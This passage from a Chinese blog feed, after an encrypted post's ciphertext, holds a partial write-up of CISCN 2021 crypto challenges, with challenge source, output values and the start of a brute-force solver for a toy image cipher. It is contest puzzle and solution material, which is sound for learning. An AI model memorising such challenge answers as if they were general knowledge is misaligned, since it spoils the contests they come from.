900e7f842cb225e5f344736802f94fc1afa400d2170ba3db5c4962eef14d3d6b75a89aa141c1535ac906685a0827e2f60ffc33104a0c996b95a0f8765290371811199b5a08e52457ce5e5afbebe60ad76c3b0de223d58ad2d1451bd05ae8c885269b3816fc5750310233f156db0577f01de5103d9e3fccb107816c771a1beed7ba27dfb384040b533532ca4121a459ae0c7e2a6367ebb4d53e5d81a1815f114e3761f0fe15a657687b7ef44454a897c449597a36cfe5e4fede65c761d4a4f48705e75d0ea95b2097127fbe6a765ec68913d533025ca7e11e9f85756c4377a58fe41be175a747e6cdee5ec02fc7bda81160f07d1a2443bbc94d94b5f4a51810bf0e7fb2dcecbee1c1847145fb41ef2517aee4020ad284272d341f8a2830ccca023b8a5fe414f74c7f51f648fa1b5032aeb8ee87da23f88f0d955a98f63bd23338be159a8f920367651b161d76a4043d41a30ad03ea4005a77a9555e456246fbc12d3cf13963d21978432444a0075e672ef6537bdaf7c9663825f70168776a701e9e811386d5d6d5b7bdbab19978e9ec7f868427326f91c878c177d2555b93fa17c140d78d836b1e30780214fef1b58490c64b8a126d7439b2de80c55619653a77c6aa3f9c37379c29016503b0871c5266eb76d94c314e8c18b3ddcd352294c65f385d341fc40d334c4e62c8ea9fefad11d5a234b23dfe10da0b8e0e8d225e3d11b2d07c3f6f9d7937e57e9ad5147be3fa57858aa790f39ffac94264331a7131502c02ee0b6a379bf4963fd2c04957c0eda006ef5494bd0e0958173ed9b805da9898291f2d01479cf18640a103618f7373a91e30810b799424a1fb6835629f0b011a54839e23870b1129c4bbee05a0c20f012df4482e8096f33981f932676245d9515349fa8c759f50d3d31b1ea7a8231424031d2deabe126e8a29c9a115b072058639b1f9d31a0003f633ed296032037d135864b4f7fad5c47022db0307f9b3767ae6ee9966f942a3ed49eb60d8f7999e7f8487e4fefc6584abfd78b4e257d8df18ca4ea107afb4de4f01d6020862f34d0548cc730f1e2ef8aaffff8ca9c9027c5844e2c5409ebad554e048785e026e14e4bd7f00cf6fc2f0bb31a8f23dc0084fd94231b40ee013e447fb7ddb47f3a2e3c8da309c5ca2ecf54df5716c0345734c5f1dfea63d0def8c717f53a0007d1085ba755fbd23c7cd52d0cad257abd95fd79ee4b683d69b8eeb7d66636c2bffd081182661352f452033994437010d96eab9fb041acfcb16f9f8e4241867ffa4f3232de1995b7187686cdf5a5ae5d1fe6cccae77a556699ef35375b3f19a7ec17aa98d650fc7310dd4e0f738b02e7bdbc2f5fb00979e9396803bf2d5e33f147530219e9f3aa71c68dc0d82c70b78e6dbb10a8f1bb28381bac04f62c3603fbc3fe1af5c41a93138b56bc5a01c770ec9c15bf707e4039c011083e89a32b9f774dd2ebeb99561caba2e3d5825d82260f67ab426679af132f5be921c999838caf38bc6892c3435ac43880f46ca2809db88289070e6cfe5e5a17b68f101ad2a0a88563f64e7f97858062dd43a9b7b7ffe09e16394c98c31723bc3afa4a736db9d9a1656783fe9dd0158f98bdee3c89aca2d15b4c7de99f4aeadbaa271702a03d4cd8248d4d2164085a640c4516ec10a15df7a252a431723c1abeb9c081d4b135e8c183dca8afff9f83283a8cb4f50fccb59c995e033000bea59edb10f692bbfc746e518b217639af53bd134af49525881f079e10d58e6a94efbbf67513119f49d1de1835ff8d2077672e26f6d3316a55d774b160d8e9213b7710f62e1c75a112da1fed68897e0c7bd8ff37c9957e722912d4fe7e729ee32d7deb17ed443bb82c1c99942b31af636f879191a4be292738fa64a114802fee0393af67f7d8447d9a742aff5286bbcef495a94ff4a3559c966ba2f9580f79febea87c55eb8206b8545f618f2399c31e545537de73d153124831e9e3925f888ac5bd304530981886b66e55323a836a18a0294e1ee4bd0444be25517a7d094cb6262322ede8c82e1c5a4b5d261ba7aa153935a908e7c0314e1674779a</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>学院工作</category>
      </categories>
  </entry>
  <entry>
    <title>20210516 国赛Crypto方向部分WP</title>
    <url>/posts/766eb6e4/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="20210516-国赛Crypto方向部分WP"><a href="#20210516-国赛Crypto方向部分WP" class="headerlink" title="20210516 国赛Crypto方向部分WP"></a>20210516 国赛Crypto方向部分WP</h1><h2 id="【古典签到】（recuring）"><a href="#【古典签到】（recuring）" class="headerlink" title="【古典签到】（recuring）"></a>【古典签到】（recuring）</h2><p><em>做完忘记名字了</em></p>
<p>一道签到题，都是古典密码，一开始用的是ADFGX加密，<a href="https://www.dcode.fr/en">推荐这个网站，贼好用</a></p>
<p>用的是默认的那个字母表，没有keyword，但是第一步出来的没有任何含义，后面是一个栅栏一个凯撒，顺序忘了</p>
<p>我组员当时是手撕的，还拿了一血，呜呜呜，别问我为什么会有这么强的组员，也别问我为什么那么菜还可以当别人组长</p>
<h2 id="move（unsolved）"><a href="#move（unsolved）" class="headerlink" title="move（unsolved）"></a>move（unsolved）</h2><p>（没做出来，有缘再更）</p>
<h3 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h3><img alt="README-a01d6b78.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-a01d6b78.png" width="" height="" >

<img alt="README-5c639665.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-5c639665.png" width="" height="" >

<img alt="README-b653abcd.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-b653abcd.png" width="" height="" >
应该是用到copperSmith

<p>task.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt, gcd</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">512</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(nbit)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    p = get_prime(nbit)</span><br><span class="line">    q = get_prime(nbit)</span><br><span class="line">    <span class="keyword">if</span> q &gt; p:</span><br><span class="line">        p, q = q, p</span><br><span class="line">    n = p * q</span><br><span class="line">    bound = <span class="built_in">int</span>(sqrt(<span class="number">2</span> * n)) // <span class="number">12</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = random.randint(<span class="number">1</span>, <span class="built_in">round</span>(sqrt(bound)))</span><br><span class="line">        y = random.randint(<span class="number">1</span>, bound) // x</span><br><span class="line">        zbound = <span class="built_in">int</span>(((p - q) * <span class="built_in">round</span>(n ** <span class="number">0.25</span>) * y) // (<span class="number">3</span> * (p + q)))</span><br><span class="line">        z = zbound - ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + zbound) % x</span><br><span class="line">        e = ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + z) // x</span><br><span class="line">        <span class="keyword">if</span> gcd(e, (p + <span class="number">1</span>) * (q + <span class="number">1</span>)) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    gifts = [<span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][:<span class="number">22</span>], <span class="number">2</span>), <span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][<span class="number">256</span>:<span class="number">276</span>], <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> n, e, gifts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p1 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    <span class="keyword">if</span> p2 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p1</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] <span class="keyword">and</span> (p1[<span class="number">1</span>] != p2[<span class="number">1</span>] <span class="keyword">or</span> p1[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>]:</span><br><span class="line">        tmp = (<span class="number">3</span> * p1[<span class="number">0</span>] * p1[<span class="number">0</span>]) * inverse(<span class="number">2</span> * p1[<span class="number">1</span>], n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = (p2[<span class="number">1</span>] - p1[<span class="number">1</span>]) * inverse(p2[<span class="number">0</span>] - p1[<span class="number">0</span>], n) % n</span><br><span class="line">    x = (tmp * tmp - p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) % n</span><br><span class="line">    y = (tmp * (p1[<span class="number">0</span>] - x) - p1[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">n, p</span>):</span></span><br><span class="line">    r = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            r = add(r, tmp)</span><br><span class="line">        n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp, tmp)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n, e, hint = gen(BITS)</span><br><span class="line">pt = (bytes_to_long(flag[:<span class="built_in">len</span>(flag) // <span class="number">2</span>]), bytes_to_long(flag[<span class="built_in">len</span>(flag) // <span class="number">2</span>:]))</span><br><span class="line">c = mul(e, pt)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h1 = <span class="subst">&#123;hint[<span class="number">0</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h2 = <span class="subst">&#123;hint[<span class="number">1</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>\n&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>output.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">h1 = <span class="number">3518005</span></span><br><span class="line">h2 = <span class="number">641975</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br></pre></td></tr></table></figure>

<h3 id="二、解题思路"><a href="#二、解题思路" class="headerlink" title="二、解题思路"></a>二、解题思路</h3><p>不会了，也截止了</p>
<h2 id="imageencrypt（recuring）"><a href="#imageencrypt（recuring）" class="headerlink" title="imageencrypt（recuring）"></a>imageencrypt（recuring）</h2><p>差一点，解密的时候有点问题，贴下用到的脚本，这里只求理解，确实效率是有点低</p>
<h3 id="一、题目代码"><a href="#一、题目代码" class="headerlink" title="一、题目代码"></a>一、题目代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag,image,r,key1,key2</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(flag[:<span class="number">5</span>]==<span class="string">&#x27;CISCN&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">str</span>(r))==<span class="number">3</span>)</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,image))</span><br><span class="line"><span class="keyword">assert</span>(flag[<span class="number">6</span>:-<span class="number">1</span>] == md5.new(data).hexdigest())</span><br><span class="line"><span class="keyword">assert</span>(key1&lt;<span class="number">256</span>)</span><br><span class="line"><span class="keyword">assert</span>(key2&lt;<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">x0 = random.random()    <span class="comment"># 产生六位小数</span></span><br><span class="line">x0 = <span class="built_in">round</span>(x0,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x),<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pixel,key1,key2,x0,m,n</span>):</span></span><br><span class="line">    num = m*n/<span class="number">8</span>    </span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x  = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 256个零</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flagimage = image</span><br><span class="line">testimage = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    testimage.append(random.randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line"><span class="built_in">print</span>(testimage)</span><br><span class="line"><span class="built_in">print</span>(encrypt(testimage,key1,key2,x0,<span class="number">16</span>,<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(encrypt(flagimage,key1,key2,x0,<span class="number">24</span>,<span class="number">16</span>))</span><br></pre></td></tr></table></figure>

<h3 id="二、直接爆破"><a href="#二、直接爆破" class="headerlink" title="二、直接爆破"></a>二、直接爆破</h3><p>主要的思路就是一个一个搞，爆他，首先key1和key2好搞，现在忘了</p>
<p>然后r的话不在下面这三个数之内就没有意义了，你可以试试（你过来呀）</p>
<p>然后我的思路是最简单的爆破，有点慢，但是能出来，当时我用我们队里另外一个队员的电脑同时跑的，他从0开始，我从0.9开始哈哈哈哈哈哈哈，然后我先跑出来了，因为是0.8开始的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"></span><br><span class="line">encrypt_flagimage = [<span class="number">198</span>, <span class="number">143</span>, <span class="number">247</span>, <span class="number">3</span>, <span class="number">152</span>, <span class="number">139</span>, <span class="number">131</span>, <span class="number">84</span>, <span class="number">181</span>, <span class="number">180</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">192</span>, <span class="number">25</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">136</span>, <span class="number">107</span>, <span class="number">190</span>, <span class="number">62</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">105</span>, <span class="number">238</span>, <span class="number">117</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">116</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">214</span>, <span class="number">171</span>, <span class="number">113</span>, <span class="number">209</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">194</span>, <span class="number">174</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">196</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">139</span>, <span class="number">135</span>, <span class="number">225</span>, <span class="number">214</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">178</span>, <span class="number">212</span>, <span class="number">185</span>, <span class="number">231</span>, <span class="number">204</span>, <span class="number">150</span>, <span class="number">204</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">142</span>, <span class="number">213</span>, <span class="number">173</span>, <span class="number">186</span>, <span class="number">166</span>, <span class="number">65</span>, <span class="number">238</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">25</span>, <span class="number">189</span>, <span class="number">148</span>, <span class="number">38</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">227</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">31</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">249</span>, <span class="number">86</span>, <span class="number">188</span>, <span class="number">86</span>, <span class="number">233</span>, <span class="number">41</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">7</span>, <span class="number">212</span>, <span class="number">234</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">245</span>, <span class="number">102</span>, <span class="number">227</span>, <span class="number">96</span>, <span class="number">160</span>, <span class="number">67</span>, <span class="number">181</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">192</span>, <span class="number">214</span>, <span class="number">210</span>, <span class="number">188</span>, <span class="number">84</span>, <span class="number">216</span>, <span class="number">215</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">233</span>, <span class="number">2</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">107</span>, <span class="number">251</span>, <span class="number">70</span>, <span class="number">128</span>, <span class="number">94</span>, <span class="number">190</span>, <span class="number">185</span>, <span class="number">210</span>, <span class="number">34</span>, <span class="number">85</span>, <span class="number">77</span>, <span class="number">29</span>, <span class="number">182</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">208</span>, <span class="number">228</span>, <span class="number">252</span>, <span class="number">73</span>, <span class="number">198</span>, <span class="number">151</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">97</span>, <span class="number">138</span>, <span class="number">235</span>, <span class="number">21</span>, <span class="number">117</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">129</span>, <span class="number">2</span>, <span class="number">253</span>, <span class="number">80</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">184</span>, <span class="number">220</span>, <span class="number">41</span>, <span class="number">82</span>, <span class="number">37</span>, <span class="number">140</span>, <span class="number">23</span>, <span class="number">143</span>, <span class="number">179</span>, <span class="number">53</span>, <span class="number">153</span>, <span class="number">113</span>, <span class="number">213</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">248</span>, <span class="number">65</span>, <span class="number">60</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">81</span>, <span class="number">48</span>, <span class="number">254</span>, <span class="number">251</span>, <span class="number">89</span>, <span class="number">195</span>, <span class="number">8</span>, <span class="number">93</span>, <span class="number">190</span>, <span class="number">66</span>, <span class="number">174</span>, <span class="number">97</span>, <span class="number">175</span>, <span class="number">210</span>, <span class="number">191</span>, <span class="number">66</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">128</span>, <span class="number">33</span>, <span class="number">230</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">239</span>, <span class="number">173</span>, <span class="number">44</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">231</span>, <span class="number">114</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">63</span>, <span class="number">103</span>, <span class="number">44</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">137</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">223</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">215</span>, <span class="number">133</span>, <span class="number">131</span>, <span class="number">240</span>, <span class="number">239</span>, <span class="number">224</span>, <span class="number">195</span>, <span class="number">140</span>, <span class="number">124</span>, <span class="number">70</span>, <span class="number">156</span>, <span class="number">221</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">9</span>, <span class="number">157</span>, <span class="number">99</span>, <span class="number">150</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">225</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">141</span>, <span class="number">135</span>, <span class="number">99</span>, <span class="number">18</span>, <span class="number">119</span>, <span class="number">63</span>, <span class="number">160</span>, <span class="number">6</span>, <span class="number">247</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">45</span>, <span class="number">199</span>, <span class="number">86</span>, <span class="number">193</span>, <span class="number">252</span>, <span class="number">21</span>, <span class="number">135</span>, <span class="number">32</span>, <span class="number">42</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">241</span>, <span class="number">49</span>, <span class="number">249</span>, <span class="number">182</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">155</span>, <span class="number">157</span>, <span class="number">61</span>, <span class="number">4</span>, <span class="number">246</span>, <span class="number">158</span>, <span class="number">52</span>, <span class="number">118</span>, <span class="number">242</span>, <span class="number">195</span>, <span class="number">54</span>, <span class="number">139</span>, <span class="number">232</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">11</span>, <span class="number">233</span>, <span class="number">58</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">137</span>, <span class="number">83</span>, <span class="number">145</span>, <span class="number">209</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">96</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">207</span>, <span class="number">29</span>, <span class="number">237</span>, <span class="number">124</span>, <span class="number">177</span>, <span class="number">166</span>, <span class="number">161</span>, <span class="number">20</span>, <span class="number">116</span>, <span class="number">122</span>, <span class="number">61</span>, <span class="number">71</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">112</span>, <span class="number">66</span>, <span class="number">94</span>, <span class="number">57</span>, <span class="number">221</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">192</span>, <span class="number">147</span>, <span class="number">5</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">174</span>, <span class="number">26</span>, <span class="number">160</span>, <span class="number">16</span>, <span class="number">188</span>, <span class="number">103</span>, <span class="number">187</span>, <span class="number">11</span>, <span class="number">238</span>, <span class="number">182</span>, <span class="number">144</span>, <span class="number">4</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">84</span>, <span class="number">100</span>, <span class="number">7</span>, <span class="number">239</span>, <span class="number">219</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">189</span>, <span class="number">166</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">141</span>, <span class="number">30</span>, <span class="number">198</span>, <span class="number">220</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">5</span>, <span class="number">45</span>]</span><br><span class="line"></span><br><span class="line">testimage = [<span class="number">205</span>, <span class="number">237</span>, <span class="number">6</span>, <span class="number">158</span>, <span class="number">24</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">32</span>, <span class="number">74</span>, <span class="number">151</span>, <span class="number">142</span>, <span class="number">186</span>, <span class="number">57</span>, <span class="number">28</span>, <span class="number">113</span>, <span class="number">62</span>, <span class="number">165</span>, <span class="number">20</span>, <span class="number">190</span>, <span class="number">37</span>, <span class="number">159</span>, <span class="number">137</span>, <span class="number">196</span>, <span class="number">44</span>, <span class="number">97</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">222</span>, <span class="number">220</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">199</span>, <span class="number">142</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">119</span>, <span class="number">232</span>, <span class="number">250</span>, <span class="number">215</span>, <span class="number">60</span>, <span class="number">162</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">63</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">217</span>, <span class="number">206</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">230</span>, <span class="number">42</span>, <span class="number">221</span>, <span class="number">71</span>, <span class="number">136</span>, <span class="number">115</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">91</span>, <span class="number">57</span>, <span class="number">61</span>, <span class="number">3</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">250</span>, <span class="number">121</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">199</span>, <span class="number">236</span>, <span class="number">190</span>, <span class="number">249</span>, <span class="number">116</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">149</span>, <span class="number">94</span>, <span class="number">214</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">203</span>, <span class="number">240</span>, <span class="number">114</span>, <span class="number">240</span>, <span class="number">29</span>, <span class="number">122</span>, <span class="number">188</span>, <span class="number">156</span>, <span class="number">53</span>, <span class="number">128</span>, <span class="number">185</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">245</span>, <span class="number">204</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">80</span>, <span class="number">229</span>, <span class="number">41</span>, <span class="number">150</span>, <span class="number">28</span>, <span class="number">195</span>, <span class="number">25</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">6</span>, <span 